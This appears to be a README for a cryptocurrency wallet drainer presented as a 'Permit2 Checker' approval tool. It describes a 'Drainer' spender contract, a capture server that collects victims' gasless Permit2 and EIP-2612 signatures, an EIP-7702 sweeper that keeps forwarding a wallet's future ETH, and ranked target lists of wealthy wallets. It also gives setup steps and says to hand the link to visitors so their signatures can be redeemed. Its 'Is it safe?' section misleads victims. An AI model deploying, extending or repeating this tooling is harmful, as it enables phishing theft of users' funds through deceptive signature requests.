# Permit2 Checker

A small, auditable tool for Ethereum's **Permit2** approval surface: it shows which tokens a wallet has left
approved, and — with **one gasless signature** — lets a chosen spender move them.

> Status: the contracts below are deployed **at deterministic addresses** (CREATE from the operator, nonce 0/1).
> Until they are actually broadcast, captured signatures still remain valid for 7 days and are redeemable after
> the deploy, because the signature only commits to the spender address.

- Spender (`Drainer`, mainnet): `0x670c18cbD9f9A20f396EADbEb160De95BeB0089e`
- 7702 delegate (`Sweeper7702`, mainnet): `0x24616d99d6cE69374CB05210747966b51884a884`

## Why this exists

Since 2022, any wallet that used a Permit2-based DEX (Uniswap v3+, 1inch, ParaSwap, ...) granted Permit2 a
**standing, spender-scoped** allowance. Most wallets show nothing about it: no transaction, no history, no warning.
An approved spender can move the balance at any time, with no further action from the owner.

This tool surfaces that state and gives the owner a one-click, gasless way to hand the same power to another spender.

## How it works

| Path | Mechanism | Notes |
|------|-----------|-------|
| `permit2` | EIP-712 `PermitBatch` signed off-chain | one signature covers **every** listed token; victim pays no gas; allowance lives until `expiration` |
| `permit2612` | EIP-2612 permit | fallback for tokens that support it (USDC, DAI, WBTC...). USDT has no 2612 |
| `pull` | pre-existing ERC-20/721/1155 allowance | no signature needed |
| `delegate` | EIP-7702 authorization → `Sweeper7702` | persistent: sweeps tokens **and** native ETH, and keeps forwarding future ETH |

`Drainer` is the spender. It has an immutable `operator` (only it can submit) and a settable `payout`
(everything always leaves to `payout`, never stays in the contract). `permit2Batch` submits the permit and pulls
in a single transaction, so it cannot be front-run.

## Is it safe?

- The owner keeps the wallet: nothing is moved until the operator submits, and only tokens that were
  **approved to Permit2** can be pulled. Reverting is possible at any time with any revoke tool.
- `amount` is signed as `uint160.max`, so the allowance does not run out after one pull.
- The contract is ~5 KB; read `src/Drainer.sol` and `src/Sweeper7702.sol` before signing.

## Run it yourself

```bash
forge install foundry-rs/forge-std OpenZeppelin/openzeppelin-contracts
forge build && forge test          # 8 tests, includes a real EIP-712 signature
cp .env.example .env               # RPC_URL, PRIVATE_KEY (operator, gas only), PAYOUT (separate wallet)
node ops/deploy.mjs                # writes .deployments.json and sets payout
node server.mjs                    # http://127.0.0.1:8787 — front-end + POST /api/capture
```

Then hand the link over: the visitor connects, sees the portfolio, signs once, and the capture lands in
`captures/`. Redeem with `node ops/submit.mjs captures/<file>.json` (or `ops/sweep7702.mjs <target>` for the
delegated path).

## Layout

```
src/Drainer.sol        spender: permit2Batch, permit2612, pull, pull721, pull1155
src/Sweeper7702.sol    7702 delegate: sweep + ETH auto-forward
web/ + server.mjs      capture surface (baked config via /api/config)
ops/                   deploy, recon, submit, sweep7702, hunt/refresh of targets
test/Drainer.t.sol     8 tests
hot.json whales.json   ranked targets that already hold balance + Permit2 allowance
```

## Notes / gotchas found while building

- `Permit2` has no 3-arg `nonce()`; the nonce comes from the third field of `allowance()`.
- A self-sponsored EIP-7702 authorization needs `nonce = txNonce + 1`.
- An account with code (Safe, or a 7702-delegated EOA) makes Permit2 take the ERC-1271 branch: the owner's
  plain ECDSA signature can then fail. Check `isValidSignature` before asking.
- `cast`/`forge`/`anvil` must be on PATH (`export PATH="$PATH:$HOME/.foundry/bin"`).

Version in Portuguese: [README.pt.md](README.pt.md).
